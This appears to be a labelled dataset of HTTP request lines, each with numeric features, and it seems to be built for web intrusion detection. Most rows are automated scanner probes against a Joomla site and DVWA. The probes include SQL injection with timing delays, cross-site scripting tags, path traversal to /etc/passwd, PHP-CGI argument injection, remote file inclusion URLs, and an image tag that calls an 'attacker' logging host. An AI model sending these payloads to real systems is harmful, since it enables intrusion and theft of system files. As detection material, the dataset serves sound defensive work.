597,1,404,507,76,12,203,3,1,POST /cgi-bin/php4-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1
91,3,200,1721,7,60,11,5,0,GET /index.php/component/mailto/?link[$acunetix]=1&template=beez_20&tmpl=component HTTP/1.1
122,5,200,3195,7,79,20,5,1,GET /index.php/component/search/?searchword='\"()&%kzsy(9729)=&ordering=alpha&searchphrase=any&areas[0]=newsfeeds HTTP/1.1
39,1,404,513,13,10,6,4,1,GET //WEB-INF/web.xml%20(copy) HTTP/1.1
140,3,200,3301,13,88,20,7,1,GET /index.php/component/search/?searchword=ul.menu\"sTYLe='acu:Expre/**/SSion(kzsy(9794))'bad=\"&ordering=popular&searchphrase=any HTTP/1.1
99,1,404,3988,7,58,15,6,1,GET /index.php/component/content/category/-1));select%20pg_sleep(6);%20--%20-uncategorised HTTP/1.1
90,2,500,2091,16,35,20,3,1,GET /index.php?format=feed'\"()%26%25<acx><ScRiPt%20>XSOv(9831)</ScRiPt>&type=rss HTTP/1.1
74,3,500,2043,9,47,9,5,1,GET /index.php/component/content/?format=feed&type=atom&view=JyI= HTTP/1.1
125,4,200,3170,13,90,12,5,1,GET /index.php/component/search/?searchword=the&ordering=newestacxScRiPtkzsyScRiPt&searchphrase=any&areas[0]=content HTTP/1.1
43,1,302,384,13,18,5,3,0,GET /DVWA/security.php?phpids=JyI= HTTP/1.1
153,4,200,3286,23,83,22,5,0,GET /index.php/component/search/?searchword=acu7994%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca7994&ordering=newest&searchphrase=all&areas[0]=content HTTP/1.1
98,1,200,3532,7,62,10,4,1,GET /index.php/2-uncategorised/%24{%40print(md5(acunetix_wvs_security_test))}-testsayfasi HTTP/1.1
129,5,200,3197,7,85,21,5,1,GET /index.php/component/search/?searchword=ul.menu'\"()&%kzsy(9518)=&ordering=alpha&searchphrase=any&areas[0]=newsfeeds HTTP/1.1
96,1,200,3512,9,36,17,6,0,GET /index.php/component/content/category/2--1%20OR%203%2b23-23-1=0%2b0%2b0%2b1%20--%20 HTTP/1.1
107,1,500,2115,11,71,7,6,1,GET /index.php/component/content/%0d%09SomeCustomInjectedHeader:%20injected_by_wvs/2-uncategorised HTTP/1.1
101,3,500,2067,9,48,18,5,1,GET /index.php/component/content/?format=feed&type=atom&view=-1%20OR%203*2>(0%2b5%2b387-387) HTTP/1.1
211,3,200,3158,7,130,46,7,1,GET /index.php/component/search/?ordering=popular&searchphrase=(select(0)from(select(sleep(12)))v)/*'%2b(select(0)from(select(sleep(12)))v)%2b'\"%2b(select(0)from(select(sleep(12)))v)%2b\"*/&searchword= HTTP/1.1
4161,1,400,485,7,64,2045,2039,1,GET /index.php/component/invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././article/2-uncategorised/1-testsayfasi HTTP/1.1
17,1,301,571,7,3,1,2,0,GET /tmp HTTP/1.1
116,3,500,2107,8,80,14,9,1,GET /index.php/component/content/?format=http://testasp.vulnweb.com/t/fit.txt%3F.jpg&type=rss&view=featured HTTP/1.1
109,3,500,2071,9,48,22,5,1,GET /index.php/component/content/?format=feed&type=atom&view=-1%20OR%203*2<(0%2b5%2b966-966)%20--%20 HTTP/1.1
85,1,404,562,7,57,5,7,1,GET /set%7cset%26set/component/content/article/2-uncategorised/1-testsayfasi HTTP/1.1
94,1,500,2103,8,55,12,8,1,GET /index.php/component/users/?view=login<img%20sRc='http://attacker-9527/log.php%3f HTTP/1.1
48,2,500,2059,9,26,6,2,1,GET /index.php?format=mnNysu5Z&type=rss HTTP/1.1
160,3,200,3184,8,120,14,8,0,GET /index.php/component/search/?ordering=oldest&searchphrase=http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.jpg&searchword= HTTP/1.1
94,3,200,3151,7,63,11,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=any&searchword=1*1*1*1 HTTP/1.1
143,3,500,2045,7,50,77,5,1,GET /index.php/component/content/?format=)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))&type=atom&view=featured HTTP/1.1
39,1,404,3990,7,17,3,5,1,GET /index.php/component/647'/ HTTP/1.1
133,3,200,3299,17,77,19,7,1,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword=1\"sTYLe='acu:Expre/**/SSion(RBUT(9104))'bad=\" HTTP/1.1
127,3,200,3143,8,91,14,9,0,GET /index.php/component/search/?ordering=popular&searchphrase=http://testasp.vulnweb.com/t/fit.txt%3F.jpg&searchword= HTTP/1.1
94,3,200,3158,9,65,8,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword=8geeM43Y HTTP/1.1
139,4,200,3281,7,98,16,5,1,GET /index.php/component/search/?searchword=ul.menu\"onmouseover=kzsy(9718)\"&ordering=category&searchphrase=all&areas[0]=weblinks HTTP/1.1
57,1,500,2055,7,26,8,5,1,GET /index.php/component/users/?view=307-0-0-0-0 HTTP/1.1
46,1,404,3995,7,23,4,5,1,GET /index.php/set%7cset%26set/users/ HTTP/1.1
119,1,200,2822,13,68,17,5,1,GET /index.php/component/users/?wvstest=javascript:domxssExecutionSink(1_%22'%5C%22%3E%3Cxsstag%3E()locxss%22) HTTP/1.1
141,3,200,338,7,76,12,5,0,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=beez_20&tmpl=response.write(9295186*9290206) HTTP/1.1
100,3,200,3162,7,68,9,5,0,GET /index.php/component/search/?searchword=ul.menu9474528&ordering=oldest&searchphrase=any HTTP/1.1
121,3,500,2113,7,81,18,5,1,GET /index.php/component/content/?format=';print(md5(acunetix_wvs_security_test));%24a='&type=atom&view=featured HTTP/1.1
96,1,500,2105,8,57,14,5,1,GET /index.php/component/users/?view=login<%25div%20style=width:expression(Uqla(9405))> HTTP/1.1
129,3,200,3265,7,79,14,5,1,GET /index.php/component/search/?ordering=category&searchphrase=all&searchword=\"%2bresponse.write(9002470*9078187)%2b\" HTTP/1.1
157,3,200,1776,9,80,13,5,0,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e%5cu0022onmouseover=pnMW(9941)%5cu0022&template=beez_20&tmpl=component HTTP/1.1
121,1,200,3256,8,86,10,11,0,GET /index.php/component/content/article/http://testasp.vulnweb.com/t/fit.txt%3F.jpg-uncategorised/1-testsayfasi HTTP/1.1
119,3,500,2081,10,64,21,5,1,GET /index.php/component/content/?format=fqV9EhY9';%20waitfor%20delay%20'0:0:3'%20--%20&type=rss&view=featured HTTP/1.1
26,1,404,503,7,10,3,2,1,GET /dump.sql.tar HTTP/1.1
118,1,404,3990,7,78,10,7,1,GET /index.php/component/%24{%40print(md5(acunetix_wvs_security_test))}/article/2-uncategorised/1-testsayfasi HTTP/1.1
97,3,200,3094,7,69,10,5,0,GET /index.php/component/search/?ordering=category&searchphrase=index.php%00&searchword= HTTP/1.1
102,4,200,3115,7,73,12,5,0,GET /index.php/component/search/?searchword=&ordering=alpha&searchphrase=all&areas[0]=content HTTP/1.1
133,1,200,3294,18,31,37,4,0,GET /index.php/2-..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg/1-testsayfasi HTTP/1.1
23,1,404,500,7,8,2,2,1,GET /admin.cgi HTTP/1.1
122,3,200,3107,7,67,28,16,1,GET /index.php/component/search/?ordering=alpha&searchphrase=../../../../../../../../../../etc/passwd&searchword= HTTP/1.1
50,1,404,3995,7,24,4,5,1,GET /index.php/%252fetc%252fpasswd/users/ HTTP/1.1
63,2,500,2045,7,23,8,2,1,GET /index.php?format=%24{9999993%2b9999290}&type=atom HTTP/1.1
101,1,301,739,15,32,20,4,1,GET /DVWA/vulnerabilities/fi?page=-1'%20OR%202%2b186-186-1=0%2b0%2b0%2b1%20or%20'Itiab4Gk'=' HTTP/1.1
123,3,500,2089,14,64,22,6,1,GET /index.php/component/content/?format=feed'\"()%26%25<acx><ScRiPt%20>p3oZ(9994)</ScRiPt>&type=rss&view=featured HTTP/1.1
123,4,200,3193,7,74,13,5,1,GET /index.php/component/search/?searchword={{10000420*9999615}}&ordering=oldest&searchphrase=all&areas[0]=content HTTP/1.1
60,2,500,1983,7,33,8,2,1,GET /index.php?format=feed&type=%252fetc%252fpasswd HTTP/1.1
108,3,200,3182,7,64,9,5,1,GET /index.php/component/search/?ordering=category&searchphrase=all&searchword={{9999742*10000313}} HTTP/1.1
132,3,200,3136,9,65,22,5,1,GET /index.php/component/search/?ordering=category&searchphrase=-1\"%20OR%202%2b411-411-1=0%2b0%2b0%2b1%20--%20&searchword= HTTP/1.1
75,1,400,485,7,26,22,16,1,GET /index.php/component/../../../../../../../../../../etc/passwd/ HTTP/1.1
30,1,404,507,7,11,3,2,1,GET /192-database.rar HTTP/1.1
57,1,200,3467,7,32,4,6,1,GET /index.php/component/content/category/2-1'\" HTTP/1.1
61,1,200,3284,7,32,6,4,0,GET /index.php/2-uncategorised/1-%252fetc%252fpasswd HTTP/1.1
105,3,200,3176,7,79,10,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword=testasp.vulnweb.com HTTP/1.1
93,3,200,3152,7,62,11,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase=all&searchword=1*1*1*1 HTTP/1.1
135,3,200,3274,7,95,15,9,1,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword=http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg HTTP/1.1
155,3,200,338,9,58,22,5,0,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=beez_20&tmpl=-1%20OR%202%2b125-125-1=0%2b0%2b0%2b1%20--%20 HTTP/1.1
200,1,404,611,16,14,34,5,1,GET /%2569%256E%2564%2565%2578%252E%2570%2568%2570%253C%2553%2563%2552%2569%2550%2574%2520%253E%254A%2549%2566%257A%25289995%2529%253C%252F%2573%2543%2572%2569%2570%2554%253E/component/users/ HTTP/1.1
94,3,200,3103,9,60,10,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase=%40%400Oo3E&searchword= HTTP/1.1
128,5,200,3198,7,84,21,5,1,GET /index.php/component/search/?searchword=ul.menu'\"()&%kzsy(9062)=&ordering=oldest&searchphrase=any&areas[0]=content HTTP/1.1
107,3,200,3181,7,64,9,5,1,GET /index.php/component/search/?searchword={{9999363*9999160}}&ordering=category&searchphrase=any HTTP/1.1
108,4,200,3167,7,79,12,5,0,GET /index.php/component/search/?searchword=the&ordering=oldest&searchphrase=all&areas[0]=newsfeeds HTTP/1.1
78,1,404,3990,7,26,26,13,1,GET /index.php?option=../../../../../../../../../../etc/passwd%00.jpg HTTP/1.1
129,3,200,3130,9,64,22,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=-1%20OR%202%2b456-456-1=0%2b0%2b0%2b1%20--%20&searchword= HTTP/1.1
83,1,200,3523,9,34,14,4,0,GET /index.php/2-uncategorised/-1%20OR%203*2>(0%2b5%2b138-138)-testsayfasi HTTP/1.1
92,1,200,3297,8,51,15,4,1,GET /index.php/extO4gmi');select%20pg_sleep(2);%20--%20-uncategorised/1-testsayfasi HTTP/1.1
107,3,200,3224,7,62,9,5,1,GET /index.php/component/search/?searchword={{10000229*10000202}}&ordering=oldest&searchphrase=all HTTP/1.1
137,3,200,3113,7,67,38,21,1,GET /index.php/component/search/?ordering=../../../../../../../../../../../../../../../proc/version&searchphrase=all&searchword= HTTP/1.1
158,4,200,3329,13,101,24,7,1,GET /index.php/component/search/?searchword=ul.menu\"sTYLe='acu:Expre/**/SSion(kzsy(9884))'bad=\"&ordering=oldest&searchphrase=any&areas[0]=newsfeeds HTTP/1.1
116,3,200,339,8,76,16,8,0,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=1&tmpl=http://testasp.vulnweb.com/t/fit.txt%3F.jpg HTTP/1.1
107,3,200,3215,7,78,11,7,0,GET /index.php/component/search/?ordering=alpha&searchphrase=all&searchword=http://www.vulnweb.com HTTP/1.1
113,3,200,3245,11,73,11,5,1,GET /index.php/component/search/?ordering=oldest&searchphrase=all&searchword=1\"onmouseover=RBUT(9833)\" HTTP/1.1
42,1,404,519,7,25,2,4,1,GET /examples/servlets/index.html HTTP/1.1
61,1,200,48245,10,32,2,5,0,GET /templates/beez_20/fonts/TitilliumMaps29L002.otf HTTP/1.1
18,1,404,495,7,4,1,2,1,GET /core HTTP/1.1
139,3,200,3229,7,78,29,14,1,GET /index.php/component/search/?ordering=oldest&searchphrase=all&searchword=/%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd HTTP/1.1
159,1,404,3990,7,87,40,7,1,GET /index.php/component/(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'\"%2b(select(0)from(select(sleep(6)))v)%2b\"*// HTTP/1.1
96,1,200,2792,8,57,12,5,1,POST /index.php/component/users/?task=\";print(md5(acunetix_wvs_security_test));%24a=\" HTTP/1.1
106,3,200,3179,7,62,9,5,1,GET /index.php/component/search/?searchword={{9999356*10000009}}&ordering=newest&searchphrase=any HTTP/1.1
43,1,302,384,11,17,5,3,1,GET /DVWA/security.php?phpids=583' HTTP/1.1
99,1,301,735,11,30,28,22,1,GET /DVWA/vulnerabilities/fi?page=/.././.././.././.././.././.././.././../etc/./passwd%2500 HTTP/1.1
137,4,200,3270,7,96,16,5,1,GET /index.php/component/search/?searchword=ul.menu\"onmouseover=kzsy(9591)\"&ordering=oldest&searchphrase=all&areas[0]=contacts HTTP/1.1
39,1,404,3990,9,18,3,5,1,GET /index.php/component/JyI=/ HTTP/1.1
130,5,200,3207,7,86,21,5,1,GET /index.php/component/search/?searchword=ul.menu'\"()&%kzsy(9518)=&ordering=oldest&searchphrase=any&areas[0]=newsfeeds HTTP/1.1
123,1,500,2173,8,87,10,8,1,GET /index.php/component/users/?view=http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.jpg HTTP/1.1
126,3,200,3222,7,71,28,16,1,GET /index.php/component/search/?ordering=oldest&searchphrase=any&searchword=../../../../../../../../../../etc/passwd HTTP/1.1
196,1,404,669,17,104,44,9,1,GET /if(now()=sysdate()%2csleep(6)%2c0)/*'XOR(if(now()=sysdate()%2csleep(6)%2c0))OR'\"XOR(if(now()=sysdate()%2csleep(6)%2c0))OR\"*//component/content/article/2-uncategorised/1-testsayfasi HTTP/1.1
86,1,404,563,11,55,5,9,1,GET /http://hitihyK8VoHpT.bxss.me//component/content/category/2-uncategorised HTTP/1.1
70,3,500,2051,7,46,8,5,1,GET /index.php/component/content/?format=feed&type=atom&view= HTTP/1.1
75,1,404,550,8,46,7,9,1,GET /http://testasp.vulnweb.com/t/fit.txt%3F.php/component/search/ HTTP/1.1
92,1,400,485,7,41,24,15,1,GET /index.php/2-uncategorised/../../../../../../../../../../etc/passwd-testsayfasi HTTP/1.1
71,2,500,1983,7,26,13,2,1,GET /index.php?format=feed&type=1%00%c0%a7%c0%a2%252527%252522 HTTP/1.1
88,3,200,3102,7,62,10,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase[]=all&searchword= HTTP/1.1
98,1,404,508,7,23,34,30,1,GET /index.php/../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd/search/ HTTP/1.1
89,1,200,3292,7,57,6,7,0,GET /index.php/%252fetc%252fpasswd/content/article/2-uncategorised/1-testsayfasi HTTP/1.1
87,1,404,3995,17,24,18,5,1,GET /index.php/component%25'%20AND%202*3*8=6*8%20AND%20'Q3Hr'!='Q3Hr%25/users/ HTTP/1.1
79,1,200,3292,7,33,15,4,1,GET /index.php/2-uncategorised/1-1%20waitfor%20delay%20'0:0:6'%20--%20 HTTP/1.1
69,1,404,556,10,35,10,8,1,GET /<a%20HrEF=http://www.vulnweb.com></a>/component/search/ HTTP/1.1
95,1,200,3247,13,62,7,7,0,GET /index.php/component/content/article/WEB-INF%5cweb.xml-uncategorised/1-testsayfasi HTTP/1.1
105,3,200,3167,7,77,10,7,0,GET /index.php/component/search/?ordering=category&searchphrase=all&searchword=//www.vulnweb.com HTTP/1.1
158,4,200,3285,23,88,22,5,0,GET /index.php/component/search/?searchword=acu9065%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca9065&ordering=category&searchphrase=any&areas[0]=categories HTTP/1.1
97,1,302,384,11,29,34,19,1,GET /DVWA/instructions.php?doc=../../../../../../../../../../../../../../../proc/version HTTP/1.1
158,3,200,1855,11,73,21,5,1,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=1Rx0MAOh';%20waitfor%20delay%20'0:0:6'%20--%20&tmpl=component HTTP/1.1
33,1,404,510,7,17,2,3,1,GET /phpmyadmin/main.php HTTP/1.1
94,1,404,3990,7,51,16,7,1,GET /index.php/component/!(()%26%26!%7c*%7c*%7c/article/2-uncategorised/1-testsayfasi HTTP/1.1
50,1,200,2753,8,27,5,5,0,POST /index.php/component/users/?task=%5c HTTP/1.1
